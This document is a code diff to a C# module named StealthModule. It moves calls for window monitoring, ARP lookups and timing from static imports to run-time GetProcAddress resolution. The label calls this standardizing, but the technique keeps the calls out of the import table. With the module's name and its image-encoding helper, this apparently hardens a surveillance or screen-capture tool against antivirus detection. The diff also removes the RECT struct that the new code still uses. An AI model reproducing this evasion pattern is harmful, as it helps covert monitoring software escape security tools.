@@ -24,27 +24,69 @@ namespace StealthModule
         private const int WS_VISIBLE = 0x10000000;
         #endregion
 
-        #region Импорты
-        [DllImport("user32.dll")]
-        private static extern IntPtr GetForegroundWindow();
+        #region NativeApi (Standardized)
+        private static class NativeApi
+        {
+            private static Dictionary<string, Delegate> _delegateCache = new Dictionary<string, Delegate>();
+            private static Dictionary<string, IntPtr> _moduleCache = new Dictionary<string, IntPtr>();
 
-        [DllImport("user32.dll")]
-        private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
+            private static IntPtr GetModule(string name)
+            {
+                if (_moduleCache.ContainsKey(name)) return _moduleCache[name];
+                IntPtr hMod = GetModuleHandleW(name);
+                if (hMod == IntPtr.Zero) hMod = LoadLibraryW(name);
+                _moduleCache[name] = hMod;
+                return hMod;
+            }
 
-        [DllImport("user32.dll")]
-        private static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint processId);
+            private static T GetPInvoke<T>(string module, string function) where T : class
+            {
+                string key = module + "!" + function;
+                if (_delegateCache.ContainsKey(key)) return _delegateCache[key] as T;
+                IntPtr hModule = GetModule(module);
+                IntPtr pFunc = GetProcAddress(hModule, function);
+                if (pFunc == IntPtr.Zero) return null;
+                var del = Marshal.GetDelegateForFunctionPointer(pFunc, typeof(T)) as T;
+                _delegateCache[key] = del;
+                return del;
+            }
 
-        [DllImport("user32.dll")]
-        private static extern int GetWindowLong(IntPtr hWnd, int nIndex);
+            [DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
+            private static extern IntPtr GetModuleHandleW(string lpModuleName);
+            [DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
+            private static extern IntPtr LoadLibraryW(string lpFileName);
+            [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
+            private static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
 
-        [DllImport("iphlpapi.dll", SetLastError = true)]
-        private static extern int SendARP(IPAddress destIp, IPAddress srcIp, byte[] macAddress, ref uint macAddressLen);
+            public static T GetK32<T>(string func) where T : class { return GetPInvoke<T>("kernel32.dll", func); }
+            public static T GetU32<T>(string func) where T : class { return GetPInvoke<T>("user32.dll", func); }
+            public static T GetIphlpapi<T>(string func) where T : class { return GetPInvoke<T>("iphlpapi.dll", func); }
+        }
 
-        [DllImport("kernel32.dll")]
-        private static extern bool QueryPerformanceFrequency(out long frequency);
+        // Delegates
+        private delegate IntPtr GetForegroundWindow_t();
+        private static GetForegroundWindow_t GetForegroundWindow { get { return NativeApi.GetU32<GetForegroundWindow_t>("GetForegroundWindow"); } }
 
-        [DllImport("kernel32.dll")]
-        private static extern bool QueryPerformanceCounter(out long count);
+        private delegate int GetWindowText_t(IntPtr hWnd, StringBuilder text, int count);
+        private static GetWindowText_t GetWindowText { get { return NativeApi.GetU32<GetWindowText_t>("GetWindowTextW"); } }
+
+        private delegate uint GetWindowThreadProcessId_t(IntPtr hWnd, out uint processId);
+        private static GetWindowThreadProcessId_t GetWindowThreadProcessId { get { return NativeApi.GetU32<GetWindowThreadProcessId_t>("GetWindowThreadProcessId"); } }
+
+        private delegate int GetWindowLong_t(IntPtr hWnd, int nIndex);
+        private static GetWindowLong_t GetWindowLong { get { return NativeApi.GetU32<GetWindowLong_t>("GetWindowLongW"); } }
+
+        private delegate int SendARP_t(uint destIp, uint srcIp, byte[] macAddress, ref uint macAddressLen);
+        private static SendARP_t SendARP { get { return NativeApi.GetIphlpapi<SendARP_t>("SendARP"); } }
+
+        private delegate bool QueryPerformanceFrequency_t(out long frequency);
+        private static QueryPerformanceFrequency_t QueryPerformanceFrequency { get { return NativeApi.GetK32<QueryPerformanceFrequency_t>("QueryPerformanceFrequency"); } }
+
+        private delegate bool QueryPerformanceCounter_t(out long count);
+        private static QueryPerformanceCounter_t QueryPerformanceCounter { get { return NativeApi.GetK32<QueryPerformanceCounter_t>("QueryPerformanceCounter"); } }
+
+        private delegate bool GetWindowRect_t(IntPtr hWnd, out RECT lpRect);
+        private static GetWindowRect_t GetWindowRect { get { return NativeApi.GetU32<GetWindowRect_t>("GetWindowRect"); } }
         #endregion
 
         #region Кэш
@@ -304,18 +346,6 @@ namespace StealthModule
                 }
             }
             catch { return null; }
-        }
-
-        [DllImport("user32.dll")]
-        private static extern bool GetWindowRect(IntPtr hWnd, out RECT lpRect);
-
-        [StructLayout(LayoutKind.Sequential)]
-        private struct RECT
-        {
-            public int Left;
-            public int Top;
-            public int Right;
-            public int Bottom;
         }
 
         private static ImageCodecInfo GetEncoderInfo(string mimeType)
